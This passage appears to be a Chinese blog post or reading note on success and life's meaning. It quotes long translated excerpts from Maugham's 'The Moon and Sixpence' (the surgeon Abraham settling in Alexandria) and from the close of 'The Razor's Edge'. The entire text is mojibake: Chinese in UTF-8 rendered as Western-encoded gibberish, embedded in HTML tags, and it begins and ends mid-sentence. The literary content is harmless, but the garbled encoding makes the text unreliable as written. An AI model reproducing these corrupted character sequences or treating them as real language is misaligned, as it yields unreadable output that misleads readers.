â€™ä¸ä¼šäº§ç”Ÿä»»ä½•ä¸œè¥¿ã€‚ä¸–ç•Œåªæ˜¯æ°¸æ’æœ¬è´¨çš„å½°æ˜¾ã€‚å¥½å§ï¼Œè¿™ä¹Ÿæ²¡é”™ã€‚ä½†ä»–éšååˆæ·»äº†ä¸€å¥ï¼Œè¯´æ¶æ˜¯ç¥åœ£çš„ç›´æ¥å½°æ˜¾ï¼Œå°±åƒå–„ä¸€æ ·ã€‚åœ¨é‚£ä¸ªç ´è´¥ã€åµé—¹çš„å°é¥­é¦†é‡Œï¼Œåœ¨æœºæ¢°é’¢ç´çš„èˆæ›²èƒŒæ™¯éŸ³ä¸‹ï¼Œå¬åˆ°è¿™äº›è¯çš„æ„Ÿè§‰å®åœ¨å¾ˆæ€ªè¯â€œ</p></blockquote><p>â€‹å†è¯´å›è‰¾ç•¥ç‰¹ï¼Œæ˜æ˜æ­»åˆ°ä¸´å¤´äº†è¿˜åœ¨ä¸ºæ— æ³•å‚åŠ æ´¾å¯¹å‘æ„ï¼›ä¸ºäººè™šä¼ªåŠ¿åˆ©</p><blockquote></blockquote><p>â€‹ä»–ä¸€ç”ŸæˆåŠŸä¸å¦åˆè¦æ€ä¹ˆå®šä¹‰å‘¢ï¼Ÿè°åˆæœ‰æƒåŠ›å®šä¹‰å‘¢ï¼Ÿ</p><p>â€‹å½“æ—¶è¯»&lt;æœˆäº®ä¸å…­ä¾¿å£«&gt;ï¼Œé‡Œé¢æœ‰ä¸€éƒ¨åˆ†æŒºæœ‰æ„æ€ï¼š</p><blockquote><p>â€‹æˆ‘ç»™è’‚é˜¿ç‘è®²äº†ä¸€ä¸ªæˆ‘åœ¨åœ£æ‰˜ç›æ–¯åŒ»é™¢è®¤è¯†çš„äººçš„æ•…äº‹ã€‚è¿™æ˜¯ä¸ªçŠ¹å¤ªäººï¼Œå§“é˜¿ä¼¯æ‹‰ç½•ã€‚ä»–æ˜¯ä¸ªé‡‘é»„å¤´å‘ã€èº«ä½“ç²—å£®çš„å¹´è½»äººã€‚æ€§æ ¼è…¼è…†ï¼Œå¯¹äººå’Œæ°”ï¼Œä½†æ˜¯å¾ˆæœ‰æ‰èƒ½ã€‚ä»–æ˜¯é ç€ä¸€ç¬”å¥–å­¦é‡‘å…¥å­¦çš„ï¼Œåœ¨äº”å¹´å­¦ä¹ æœŸé—´ï¼Œä»»ä½•ä¸€ç§å¥–é‡‘åªè¦ä»–æœ‰æœºä¼šç”³è¯·å°±ç»å¯¹æ²¡æœ‰æ—äººçš„ä»½å„¿ã€‚ä»–å…ˆå½“äº†ä½é™¢å†…ç§‘åŒ»ç”Ÿï¼Œåæ¥åˆå½“äº†ä½é™¢å¤–ç§‘åŒ»ç”Ÿã€‚æ²¡æœ‰äººä¸æ‰¿è®¤ä»–çš„æ‰åè¿‡äººã€‚æœ€åä»–è¢«é€‰è¿›é¢†å¯¼æœºæ„ä¸­ï¼Œä»–çš„å‰ç¨‹å·²ç»æœ‰äº†å¯é çš„ä¿è¯ã€‚æŒ‰ç…§ä¸–æƒ…æ¨è®ºï¼Œä»–åœ¨è‡ªå·±è¿™é—¨äº‹ä¸šä¸Šè‚¯å®šä¼šé£é»„è…¾è¾¾ã€ååˆ©åŒæ”¶çš„ã€‚åœ¨æ­£å¼ä¸Šä»»ä»¥å‰ï¼Œä»–æƒ³åº¦ä¸€æ¬¡å‡ï¼›å› ä¸ºä»–è‡ªå·±æ²¡æœ‰é’±ï¼Œæ‰€ä»¥åœ¨ä¸€è‰˜å¼€å¾€åœ°ä¸­æµ·çš„ä¸å®šæœŸè´§èˆ¹ä¸Šè°‹äº†ä¸ªåŒ»ç”Ÿä½ç½®ã€‚è¿™ç§è´§è½®ä¸Šä¸€èˆ¬æ˜¯æ²¡æœ‰åŒ»ç”Ÿçš„ï¼Œåªæ˜¯ç”±äºåŒ»é™¢é‡Œæœ‰ä¸€åé«˜çº§å¤–ç§‘åŒ»ç”Ÿè®¤è¯†è·‘è¿™æ¡èˆªçº¿çš„ä¸€å®¶è½®èˆ¹å…¬å¸çš„ç»ç†ï¼Œè´§è½®çœ‹åœ¨ç»ç†æƒ…é¢ä¸Šæ‰å½•ç”¨äº†é˜¿ä¼¯æ‹‰ç½•ã€‚<br>â€‹å‡ ä¸ªæ˜ŸæœŸä»¥åï¼ŒåŒ»é™¢é¢†å¯¼äººæ”¶åˆ°ä¸€ä»½è¾å‘ˆï¼Œé˜¿ä¼¯æ‹‰ç½•å£°æ˜ä»–å†³å®šæ”¾å¼ƒè¿™ä¸ªäººäººå«‰ç¾¡çš„ä½ç½®ã€‚è¿™ä»¶äº‹ä½¿äººä»¬æ„Ÿåˆ°æå…¶æƒŠè¯§ï¼Œåƒå¥‡ç™¾æ€ªçš„è°£è¨€ä¸èƒ«è€Œèµ°ã€‚æ¯é€¢ä¸€ä¸ªäººå¹²å‡ºä¸€ä»¶å‡ºäººæ„æ–™çš„äº‹ï¼Œä»–çš„ç›¸è¯†ä»¬æ€»æ˜¯æ›¿ä»–æƒ³å‡ºç§ç§æœ€ä»¤äººæ— æ³•ç½®ä¿¡çš„åŠ¨æœºã€‚ä½†æ˜¯æ—¢ç„¶æ—©å°±æœ‰äººå‡†å¤‡å¥½å¡«è¡¥ä»–ç•™ä¸‹çš„ç©ºç¼ºï¼Œé˜¿ä¼¯æ‹‰ç½•ä¸ä¹…ä¹Ÿå°±è¢«äººé—å¿˜äº†ã€‚ä»¥åå†ä¹Ÿæ²¡äººå¬åˆ°ä»–çš„ä»»ä½•æ¶ˆæ¯ã€‚è¿™ä¸ªäººå°±è¿™æ ·ä»äººä»¬çš„è®°å¿†é‡Œæ¶ˆå¤±äº†ã€‚<br>â€‹å¤§çº¦åå¹´ä¹‹åï¼Œæœ‰ä¸€æ¬¡æˆ‘ä¹˜èˆ¹å»äºšå†å±±å¤§æ¸¯ã€‚å³å°†ç™»é™†ä¹‹å‰ï¼Œä¸€å¤©æ—©ä¸Šï¼Œæˆ‘è¢«é€šçŸ¥åŒå…¶ä»–æ—…å®¢ä¸€èµ·æ’å¥½é˜Ÿï¼Œç­‰å¾…åŒ»ç”Ÿä¸Šèˆ¹æ¥æ£€æŸ¥èº«ä½“ã€‚æ¥çš„åŒ»ç”Ÿæ˜¯ä¸ªè¡£å±¥å¯’é…¸ã€èº«ä½“è‚¥ç¡•çš„äººã€‚å½“ä»–æ‘˜ä¸‹å¸½å­ä»¥åï¼Œæˆ‘å‘ç°è¿™äººçš„å¤´å‘å·²ç»å®Œå…¨ç§ƒäº†ã€‚æˆ‘è§‰å¾—ä»¿ä½›è¿‡å»åœ¨ä»€ä¹ˆåœ°æ–¹è§è¿‡ä»–ã€‚å¿½ç„¶ï¼Œæˆ‘æƒ³èµ·æ¥äº†ã€‚<br>â€‹â€œé˜¿ä¼¯æ‹‰ç½•ï¼Œâ€æˆ‘å–Šé“ã€‚<br>â€‹ä»–è½¬è¿‡å¤´æ¥ï¼Œè„¸ä¸Šæ˜¾å‡ºæƒŠå¥‡çš„ç¥è‰²ã€‚æ„£äº†ä¸€ä¼šå„¿ï¼Œä»–ä¹Ÿè®¤å‡ºæˆ‘æ¥ï¼Œç«‹åˆ»æ¡ä½æˆ‘çš„æ‰‹ã€‚åœ¨æˆ‘ä»¬ä¸¤äººå„è‡ªæƒŠå¹äº†ä¸€ç•ªåï¼Œä»–å¬è¯´æˆ‘å‡†å¤‡åœ¨äºšå†å±±å¤§æ¸¯è¿‡å¤œï¼Œä¾¿é‚€è¯·æˆ‘åˆ°è‹±ä¾¨ä¿±ä¹éƒ¨å»åƒæ™šé¥­ã€‚åœ¨æˆ‘ä»¬ä¼šé¢ä»¥åï¼Œæˆ‘å†æ¬¡è¡¨ç¤ºåœ¨è¿™ä¸ªåœ°æ–¹é‡åˆ°ä»–å®åœ¨å‡ºä¹æˆ‘çš„æ„æ–™ä¹‹å¤–ã€‚ä»–ç°åœ¨çš„èŒåŠ¡ç›¸å½“ä½å¾®ï¼Œä»–ç»™äººçš„å°è±¡ä¹Ÿå¾ˆå¯’é…¸ã€‚è¿™ä»¥åä»–ç»™æˆ‘è®²äº†ä»–çš„æ•…äº‹ã€‚åœ¨ä»–å‡ºå‘åˆ°åœ°ä¸­æµ·åº¦å‡çš„æ—¶å€™ï¼Œä»–ä¸€å¿ƒæƒ³çš„æ˜¯å†å›ä¼¦æ•¦å»ï¼Œåˆ°åœ£Â·æ‰˜ç›æ–¯åŒ»é™¢å»å°±èŒã€‚ä¸€å¤©æ—©æ™¨ï¼Œä»–ä¹˜çš„é‚£è‰˜è´§è½®åœ¨äºšå†å±±å¤§æ¸¯é å²¸ï¼Œä»–ä»ç”²æ¿ä¸Šçœ‹ç€è¿™åº§é˜³å…‰ç…§è€€ä¸‹çš„ç™½è‰²åŸå¸‚ï¼Œçœ‹ç€ç å¤´ä¸Šçš„äººç¾¤ã€‚ä»–çœ‹ç€ç©¿ç€è¤´è¤›çš„è½§åˆ«ä¸è¡£æœçš„å½“åœ°äººï¼Œä»è‹ä¸¹æ¥çš„é»‘äººï¼Œå¸Œè…Šäººå’Œæ„å¤§åˆ©äººæˆç¾¤ç»“é˜Ÿã€åµåµåš·åš·ï¼ŒåœŸè€³å…¶äººæˆ´ç€å¹³é¡¶æ— æªçš„åœŸè€³å…¶å°å¸½ï¼Œä»–çœ‹ç€é˜³å…‰å’Œç¢§è“çš„å¤©ç©ºã€‚å°±åœ¨è¿™ä¸ªæ—¶å€™ï¼Œä»–çš„å¿ƒå¢ƒå¿½ç„¶å‘ç”Ÿäº†å¥‡å¼‚çš„å˜åŒ–ã€‚ä»–æ— æ³•æè¿°è¿™æ˜¯æ€ä¹ˆä¸€å›äº‹ã€‚äº‹æƒ…æ¥å¾—éå¸¸çªå…€ï¼Œæ®ä»–è¯´ï¼Œå¥½åƒæ™´å¤©å“èµ·ä¸€å£°éœ¹é›³ï¼›ä½†ä»–è§‰å¾—è¿™ä¸ªè­¬å–»ä¸å¤Ÿå¦¥å½“ï¼Œåˆæ”¹å£è¯´å¥½åƒå¾—åˆ°äº†ä»€ä¹ˆå¯ç¤ºã€‚ä»–çš„å¿ƒå¥½åƒè¢«ä»€ä¹ˆä¸œè¥¿æªäº†ä¸€ä¸‹ã€‚çªç„¶é—´ï¼Œä»–æ„Ÿåˆ°ä¸€é˜µç‹‚å–œï¼Œæœ‰ä¸€ç§å–å¾—æ— é™è‡ªç”±çš„æ„Ÿè§‰ã€‚ä»–è§‰å¾—è‡ªå·±å¥½åƒå›åˆ°äº†è€å®¶ï¼Œä»–å½“æ—¶å½“åœ°å°±æ‰“å®šä¸»æ„ï¼Œä»Šåçš„æ—¥å­ä»–éƒ½è¦åœ¨äºšå†å±±å¤§åº¦è¿‡äº†ã€‚ç¦»å¼€è´§è½®å¹¶æ²¡æœ‰ä»€ä¹ˆå›°éš¾ï¼›äºŒåå››å°æ—¶ä»¥åï¼Œä»–å·²ç»å¸¦ç€è‡ªå·±çš„å…¨éƒ¨è¡Œæç™»å²¸äº†ã€‚<br>â€‹â€œèˆ¹é•¿ä¸€å®šä¼šè§‰å¾—ä½ å‘ç–¯äº†ï¼Œâ€æˆ‘ç¬‘ç€è¯´ã€‚<br>â€‹â€œåˆ«äººçˆ±æ€ä¹ˆæƒ³å°±æ€ä¹ˆæƒ³ï¼Œæˆ‘æ‰ä¸åœ¨ä¹å‘¢ã€‚åšå‡ºè¿™ä»¶äº‹æ¥çš„ä¸æ˜¯æˆ‘ï¼Œæ˜¯æˆ‘èº«ä½“é‡Œä¸€ç§è¿œæ¯”æˆ‘è‡ªå·±çš„æ„å¿—æ›´å¼ºå¤§çš„åŠ›é‡ã€‚ä¸Šå²¸ä»¥åï¼Œæˆ‘å››å¤„çœ‹äº†çœ‹ï¼Œæƒ³ç€æˆ‘è¦åˆ°ä¸€å®¶å¸Œè…Šäººå¼€çš„å°æ—…é¦†å»ï¼›æˆ‘è§‰å¾—æˆ‘çŸ¥é“åœ¨å“ªé‡Œèƒ½æ‰¾åˆ°è¿™å®¶æ—…é¦†ã€‚ä½ çŒœæ€ä¹ˆç€ï¼Ÿæˆ‘ä¸€ç‚¹å„¿ä¹Ÿæ²¡æœ‰è´¹åŠ²å„¿å°±èµ°åˆ°è¿™å®¶æ—…é¦†å‰è¾¹ï¼Œæˆ‘ä¸€çœ‹è§è¿™åœ°æ–¹é©¬ä¸Šå°±è®¤å‡ºæ¥äº†ã€‚â€<br>â€‹â€œä½ è¿‡å»åˆ°è¿‡äºšå†å±±å¤§æ¸¯å—ï¼Ÿâ€<br>â€‹â€œæ²¡æœ‰ã€‚åœ¨è¿™æ¬¡å‡ºå›½å‰æˆ‘ä»æ¥æ²¡æœ‰ç¦»å¼€è¿‡è‹±å›½ã€‚â€<br>â€‹ä¸ä¹…ä»¥åï¼Œä»–å°±åœ¨å…¬ç«‹åŒ»é™¢æ‰¾åˆ°ä¸ªå·¥ä½œï¼Œä»æ­¤ä¸€ç›´å¾…åœ¨é‚£é‡Œã€‚<br>â€‹â€œä½ ä»æ¥æ²¡æœ‰åæ‚”è¿‡å—ï¼Ÿâ€<br>â€‹â€œä»æ¥æ²¡æœ‰ã€‚ä¸€åˆ†é’Ÿä¹Ÿæ²¡æœ‰åæ‚”è¿‡ã€‚æˆ‘æŒ£çš„é’±åˆšå¤Ÿç»´æŒç”Ÿæ´»ï¼Œä½†æ˜¯æˆ‘æ„Ÿåˆ°å¿ƒæ»¡æ„è¶³ã€‚æˆ‘ä»€ä¹ˆè¦æ±‚ä¹Ÿæ²¡æœ‰ï¼Œåªå¸Œæœ›è¿™æ ·æ´»ä¸‹å»ï¼Œç›´åˆ°æˆ‘æ­»ã€‚æˆ‘ç”Ÿæ´»å¾—éå¸¸å¥½ã€‚â€<br>â€‹ç¬¬äºŒå¤©æˆ‘å°±ç¦»å¼€äº†äºšå†å±±å¤§æ¸¯ï¼Œç›´åˆ°ä¸ä¹…ä»¥å‰æˆ‘æ‰åˆæƒ³èµ·é˜¿ä¼¯æ‹‰ç½•çš„äº‹ã€‚é‚£æ˜¯æˆ‘åŒå¦å¤–ä¸€ä¸ªè¡ŒåŒ»çš„è€æœ‹å‹ï¼Œé˜¿è±å…‹Â·å¡å°”ç±³å‡¯å°”ä¸€åŒåƒé¥­çš„æ—¶å€™ã€‚å¡å°”ç±³å‡¯å°”å›è‹±å›½æ¥çŸ­æœŸåº¦å‡ï¼Œæˆ‘å¶ç„¶åœ¨è¡—å¤´ä¸Šé‡è§äº†ä»–ã€‚ä»–åœ¨å¤§æˆ˜ä¸­å·¥ä½œå¾—éå¸¸å‡ºè‰²ï¼Œè£è·äº†çˆµå£«å°å·ã€‚æˆ‘å‘ä»–è¡¨ç¤ºäº†ç¥è´ºã€‚æˆ‘ä»¬çº¦å¥½ä¸€åŒæ¶ˆç£¨ä¸€ä¸ªæ™šä¸Šï¼Œä¸€èµ·å™å™æ—§ã€‚æˆ‘ç­”åº”åŒä»–ä¸€èµ·åƒæ™šé¥­ï¼Œä»–å»ºè®®ä¸å†çº¦è¯·åˆ«äººï¼Œè¿™æ ·æˆ‘ä¿©å°±å¯ä»¥ä¸å—å¹²æ‰°åœ°ç•…è°ˆä¸€ä¸‹äº†ã€‚ä»–åœ¨å®‰çš‡åè¡—æœ‰ä¸€æ‰€è€å®…å­ï¼Œå¸ƒç½®å¾ˆä¼˜é›…ï¼Œå› ä¸ºä»–æ˜¯ä¸€ä¸ªå¾ˆå¯Œäºè‰ºæœ¯é‰´èµåŠ›çš„äººã€‚æˆ‘åœ¨é¤å…çš„å¢™ä¸Šçœ‹åˆ°ä¸€å¹…è´æ´›æ‰˜çš„ç”»ï¼Œè¿˜æœ‰ä¸¤å¹…æˆ‘å¾ˆç¾¡æ…•çš„ä½èŒƒå°¼çš„ä½œå“ã€‚å½“ä»–çš„å¦»å­ï¼Œä¸€ä¸ªç©¿ç€é‡‘è‰²è¡£æœã€é«˜èº«é‡ã€æ ·å­è®¨äººå–œæ¬¢çš„å¦‡å¥³ç¦»å¼€æˆ‘ä»¬ä»¥åï¼Œæˆ‘ç¬‘ç€å¯¹ä»–è¯´ï¼Œä»–ä»Šå¤©çš„ç”Ÿæ´»åŒæˆ‘ä»¬åœ¨åŒ»å­¦é™¢åšå­¦ç”Ÿçš„æ—¶ä»£ç›¸æ¯”ï¼Œå˜åŒ–çœŸæ˜¯å¤ªå¤§äº†ã€‚é‚£æ—¶ï¼Œæˆ‘ä»¬åœ¨å¨æ–¯æ•æ–¯ç‰¹æ¡¥å¤§è¡—ä¸€å®¶å¯’é…¸çš„æ„å¤§åˆ©é¤é¦†åƒä¸€é¡¿é¥­éƒ½è®¤ä¸ºæ˜¯éå¸¸å¥¢ä¾ˆçš„äº‹ã€‚ç°åœ¨é˜¿è±å…‹Â·å¡å°”ç±³å‡¯å°”åœ¨å…­ä¸ƒå®¶å¤§åŒ»é™¢éƒ½å…¼ä»»è¦èŒï¼Œæ®æˆ‘ä¼°è®¡ï¼Œä¸€å¹´å¯ä»¥æœ‰ä¸€ä¸‡é•‘çš„æ”¶å…¥ã€‚è¿™æ¬¡å—å°ä¸ºçˆµå£«ï¼Œåªä¸è¿‡æ˜¯ä»–è¿Ÿæ—©è¦äº«å—åˆ°çš„ç¬¬ä¸€ä¸ªè£èª‰è€Œå·²ã€‚<br>â€‹â€œæˆ‘æ··å¾—ä¸é”™ï¼Œâ€ä»–è¯´ï¼Œâ€œä½†æ˜¯å¥‡æ€ªçš„æ˜¯ï¼Œè¿™ä¸€åˆ‡éƒ½å½’åŠŸäºæˆ‘å¶ç„¶äº¤äº†ä¸€ä¸ªå¥½è¿ã€‚â€<br>â€‹â€œæˆ‘ä¸æ‡‚ä½ è¯´çš„æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿâ€<br>â€‹â€œä¸æ‡‚ï¼Ÿä½ è¿˜è®°å¾—é˜¿ä¼¯æ‹‰ç½•å§ï¼Ÿåº”è¯¥é£é»„è…¾è¾¾çš„æœ¬è¯¥æ˜¯ä»–ã€‚åšå­¦ç”Ÿçš„æ—¶å€™ï¼Œä»–å¤„å¤„æŠŠæˆ‘æ‰“å¾—æƒ¨è´¥ã€‚å¥–é‡‘ä¹Ÿå¥½ï¼ŒåŠ©å­¦é‡‘ä¹Ÿå¥½ï¼Œéƒ½è¢«ä»–ä»æˆ‘æ‰‹é‡Œå¤ºå»ï¼›å“ªæ¬¡æˆ‘éƒ½ç”˜æ‹œä¸‹é£ã€‚å¦‚æœä»–è¿™æ ·ç»§ç»­ä¸‹å»ï¼Œæˆ‘ç°åœ¨çš„åœ°ä½å°±æ˜¯ä»–çš„äº†ã€‚ä»–å¯¹äºå¤–ç§‘æ‰‹æœ¯ç®€ç›´æ˜¯ä¸ªå¤©æ‰ã€‚è°ä¹Ÿæ— æ³•åŒä»–ç«äº‰ã€‚å½“ä»–è¢«æŒ‡æ´¾ä¸ºåœ£Â·æ‰˜ç›æ–¯é™„å±åŒ»å­¦é™¢æ³¨å†Œå‘˜çš„æ—¶å€™ï¼Œæˆ‘æ˜¯ç»å¯¹æ²¡æœ‰å¸Œæœ›è¿›å…¥é¢†å¯¼æœºæ„çš„ã€‚æˆ‘åªèƒ½å¼€ä¸šå½“ä¸ªåŒ»ç”Ÿï¼Œä½ ä¹ŸçŸ¥é“ï¼Œä¸€ä¸ªæ™®é€šå¼€ä¸šè¡ŒåŒ»çš„äººæœ‰å¤šå¤§å¯èƒ½è·³å‡ºè¿™ä¸ªæ§½æ§½å»ã€‚ä½†æ˜¯é˜¿ä¼¯æ‹‰ç½•å´è®©ä½äº†ï¼Œä»–çš„ä½å­è®©æˆ‘å¼„åˆ°æ‰‹äº†ã€‚è¿™æ ·å°±ç»™äº†æˆ‘æ­¥æ­¥é«˜å‡çš„æœºä¼šäº†ã€‚â€<br>â€‹â€œæˆ‘æƒ³ä½ è¯´çš„è¯æ˜¯çœŸçš„ã€‚â€<br>â€‹â€œè¿™å®Œå…¨æ˜¯è¿æ°”ã€‚æˆ‘æƒ³ï¼Œé˜¿ä¼¯æ‹‰ç½•è¿™äººå¿ƒç†ä¸€å®šå˜æ€äº†ã€‚è¿™ä¸ªå¯æ€œè™«ï¼Œä¸€ç‚¹å„¿æ•‘ä¹Ÿæ²¡æœ‰äº†ã€‚ä»–åœ¨äºšå†å±±å¤§æ¸¯å«ç”Ÿéƒ¨é—¨æ‰¾äº†ä¸ªå°å·®äº‹â€”â€”æ£€ç–«å‘˜ä»€ä¹ˆçš„ã€‚æœ‰äººå‘Šè¯‰æˆ‘ï¼Œä»–åŒä¸€ä¸ªä¸‘é™‹çš„å¸Œè…Šè€å©†å­ä½åœ¨ä¸€èµ·ï¼Œç”Ÿäº†åŠæ‰“é•¿ç€ç˜°ç–¬ç–™ç˜©çš„å°å´½å­ã€‚æ‰€ä»¥æˆ‘æƒ³ï¼Œé—®é¢˜ä¸åœ¨äºä¸€ä¸ªäººè„‘å­èªæ˜ä¸èªæ˜ï¼ŒçœŸæ­£é‡è¦çš„æ˜¯è¦æœ‰ä¸ªæ€§ã€‚é˜¿ä¼¯æ‹‰ç½•ç¼ºå°‘çš„æ­£æ˜¯ä¸ªæ€§ã€‚â€<br>â€‹ä¸ªæ€§ï¼Ÿåœ¨æˆ‘çœ‹æ¥ï¼Œä¸€ä¸ªäººå› ä¸ºçœ‹åˆ°å¦å¤–ä¸€ç§ç”Ÿæ´»æ–¹å¼æ›´æœ‰é‡å¤§çš„æ„ä¹‰ï¼Œåªç»è¿‡åŠå°æ—¶çš„è€ƒè™‘å°±ç”˜æ„¿æŠ›å¼ƒä¸€ç”Ÿçš„äº‹ä¸šå‰é€”ï¼Œè¿™æ‰éœ€è¦å¾ˆå¼ºçš„ä¸ªæ€§å‘¢ã€‚è´¸ç„¶èµ°å‡ºè¿™ä¸€æ­¥ï¼Œä»¥åæ°¸ä¸åæ‚”ï¼Œé‚£éœ€è¦çš„ä¸ªæ€§å°±æ›´å¤šäº†ã€‚ä½†æ˜¯æˆ‘ä»€ä¹ˆä¹Ÿæ²¡è¯´ã€‚é˜¿è±å…‹Â·å¡å°”ç±³å‡¯å°”ç»§ç»­æ²‰æ€ç€è¯´ï¼š<br>â€‹â€œå½“ç„¶äº†ï¼Œå¦‚æœæˆ‘å¯¹é˜¿ä¼¯æ‹‰ç½•çš„è¡Œå¾„æ•…ä½œé—æ†¾ï¼Œæˆ‘è¿™äººä¹Ÿå°±å¤ªè™šä¼ªäº†ã€‚ä¸ç®¡æ€ä¹ˆè¯´ï¼Œæ­£å› ä¸ºä»–èµ°äº†è¿™ä¹ˆä¸€æ­¥ï¼Œæ‰è®©æˆ‘å äº†ä¾¿å®œã€‚â€ä»–å¸ç€ä¸€æ”¯é•¿é•¿çš„å¯‡ç½—çº³ç‰Œå“ˆç“¦é‚£é›ªèŒ„çƒŸï¼Œèˆ’é€‚åœ°å–·ç€çƒŸåœˆã€‚â€œä½†æ˜¯å¦‚æœè¿™ä»¶äº‹åŒæˆ‘ä¸ªäººæ²¡æœ‰ç‰µè¿çš„è¯ï¼Œæˆ‘æ˜¯ä¼šä¸ºä»–è™šæ·æ‰åæ„Ÿåˆ°å¯æƒœçš„ã€‚ä¸€ä¸ªäººç«Ÿè¿™æ ·ç³Ÿè¹‹è‡ªå·±å®åœ¨å¤ªä»¤äººå¿ƒç—›äº†ã€‚â€<br>â€‹æˆ‘å¾ˆæ€€ç–‘ï¼Œé˜¿ä¼¯æ‹‰ç½•æ˜¯å¦çœŸçš„ç³Ÿè¹‹äº†è‡ªå·±ã€‚åšè‡ªå·±æœ€æƒ³åšçš„äº‹ï¼Œç”Ÿæ´»åœ¨è‡ªå·±å–œçˆ±çš„ç¯å¢ƒé‡Œï¼Œæ·¡æ³Šå®é™ã€ä¸ä¸–æ— äº‰ï¼Œè¿™éš¾é“æ˜¯ç³Ÿè¹‹è‡ªå·±å—ï¼Ÿä¸æ­¤ç›¸åï¼Œåšä¸€ä¸ªè‘—åçš„å¤–ç§‘åŒ»ç”Ÿï¼Œå¹´è–ªä¸€ä¸‡é•‘ï¼Œå¨¶ä¸€ä½ç¾ä¸½çš„å¦»å­ï¼Œå°±æ˜¯æˆåŠŸå—ï¼Ÿæˆ‘æƒ³ï¼Œè¿™ä¸€åˆ‡éƒ½å–å†³äºä¸€ä¸ªäººå¦‚ä½•çœ‹å¾…ç”Ÿæ´»çš„æ„ä¹‰ï¼Œå–å†³äºä»–è®¤ä¸ºå¯¹ç¤¾ä¼šåº”å°½ä»€ä¹ˆä¹‰åŠ¡ï¼Œå¯¹è‡ªå·±æœ‰ä»€ä¹ˆè¦æ±‚ã€‚ä½†æ˜¯æˆ‘è¿˜æ˜¯æ²¡æœ‰è¯´ä»€ä¹ˆï¼›æˆ‘æœ‰ä»€ä¹ˆèµ„æ ¼åŒä¸€ä½çˆµå£«äº‰è¾©å‘¢ï¼Ÿ</p></blockquote><p>â€‹</p><p>â€‹ä¹Ÿè®¸äººç”Ÿçš„æ¥å¤„å·²æ— è¿¹å¯å¯»ï¼Œç”Ÿå‘½çš„å»å¤„ä¼¼ä¹ä¹Ÿæ˜¯æ³¢æ¾œä¸æƒŠï¼Œä½†æ¢¦æƒ³å’Œæ„ä¹‰è¿™ä»¶äº‹ï¼Œæˆ–è€…å¯ä»¥ä¸é‚£ä¹ˆé«˜é«˜åœ¨ä¸Šï¼Œå°±æ”¾åœ¨å…œé‡Œï¼Œæ”¾åœ¨é¥­æ¡Œä¸Šï¼Œæ”¾åœ¨ä½ æŠ¬å¤´çœ‹å¤©ä½å¤´è¯»ä¹¦å¬æ­Œè¿™äº›çäº‹ä¸Šã€‚</p><blockquote><p>è¿™å°±æ˜¯æˆ‘çš„æ•…äº‹çš„ç»“æŸã€‚æˆ‘ä»æ²¡æœ‰å¬åˆ°æ‹‰é‡Œçš„æ¶ˆæ¯ï¼Œä¹Ÿä¸æŒ‡æœ›å¬åˆ°ã€‚ç”±äºä»–ä¸€èˆ¬éƒ½æŒ‰ç…§è‡ªå·±çš„æ‰“ç®—è¡Œäº‹ï¼Œæˆ‘æƒ³ä»–å›åˆ°ç¾å›½ä»¥åï¼Œå¯èƒ½å°±åœ¨æ±½è½¦ä¿®é…è¡Œé‡Œæ‰¾ä¸€ä¸ªå·¥ä½œï¼Œç„¶åå½“å¡è½¦å¸æœºï¼Œç›´åˆ°ä»–è·å¾—å…³äºä»–é˜”åˆ«å¤šå¹´çš„è¿™ä¸ªå›½å®¶çš„çŸ¥è¯†ä¸ºæ­¢ã€‚åœ¨è¾¾åˆ°è¿™é¡¹ç›®çš„ä»¥åï¼Œä»–å¾ˆå¯èƒ½æŠŠå¼€å‡ºç§Ÿæ±½è½¦çš„æ€ªæƒ³æ³•ä»˜è¯¸å®æ–½ï¼šè¯šç„¶ï¼Œè¿™åœ¨å½“æ—¶ä¸è¿‡æ˜¯æˆ‘ä»¬åœ¨å’–å•¡é¦†é‡Œå¯¹é¢åæ—¶éšä¾¿è¯´çš„ä¸€å¥ç©ç¬‘è¯ï¼Œä½†æ˜¯ï¼Œå¦‚æœä»–å½“çœŸè¿™æ ·åšèµ·æ¥ï¼Œæˆ‘ä¹Ÿä¸æ¯«ä¸æ„Ÿåˆ°å¥‡æ€ªï¼›æˆ‘è€Œä¸”åæ¥æ¯æ¬¡åœ¨çº½çº¦é›‡å‡ºç§Ÿæ±½è½¦æ—¶æ€»è¦æŠŠå¸æœºçœ‹ä¸€çœ¼ï¼ŒæŒ‡æœ›è¯´ä¸å®šä¼šå’Œæ‹‰é‡Œçš„é‚£åŒæ·±é™·çš„åº„é‡è€Œå¾®ç¬‘çš„çœ¼ç›ç¢°ä¸Šã€‚æˆ‘ä»æ¥æ²¡æœ‰ç¢°åˆ°è¿‡ã€‚å¤§æˆ˜çˆ†å‘äº†ã€‚ä»–å¹´çºªä¸å°ï¼Œé£è¡Œå½“ç„¶è°ˆä¸ä¸Šï¼Œä½†å¯èƒ½é‡æ–°å»å¼€å¡è½¦ï¼Œåœ¨å›½å†…æˆ–åœ¨å›½å¤–ï¼›ä¹Ÿå¯èƒ½åœ¨ä¸€å®¶å·¥å‚åšå·¥ã€‚æƒ³æ¥ä»–ä¼šåœ¨ç©ºä½™çš„æ—¶é—´å†™ä¸€æœ¬ä¹¦ï¼Œè¯•å›¾é˜è¿°ä»–çš„äººç”Ÿä½“ä¼šå’Œå¯¹è‡ªå·±åŒç±»çš„æ•™å¯¼ï¼›å¯æ˜¯ï¼Œå¦‚æœåœ¨å†™çš„è¯ï¼Œä¹Ÿè¦ç­‰å¾ˆé•¿çš„æ—¶é—´æ‰ä¼šå®Œæˆã€‚ä»–æœ‰çš„æ˜¯æ—¶é—´ï¼›å²æœˆåœ¨ä»–èº«ä¸Šæ²¡æœ‰ç•™ä¸‹ç—•è¿¹ï¼›ä¸ç®¡ä»å“ªä¸€æ–¹é¢è¯´ï¼Œä»–è¿˜æ˜¯ä¸ªé’å¹´ã€‚<br>ä»–æ²¡æœ‰é‡å¿ƒï¼Œä¸è¦åï¼›ä»–æœ€åŒæ¶æˆä¸ºçŸ¥åäººå£«ï¼›æ‰€ä»¥å¾ˆå¯èƒ½å®‰å¿ƒå®‰æ„åœ°è¿‡ç€è‡ªå·±æŒ‘é€‰çš„ç”Ÿæ´»ï¼Œæˆ‘è¡Œæˆ‘ç´ ï¼Œåˆ«æ— 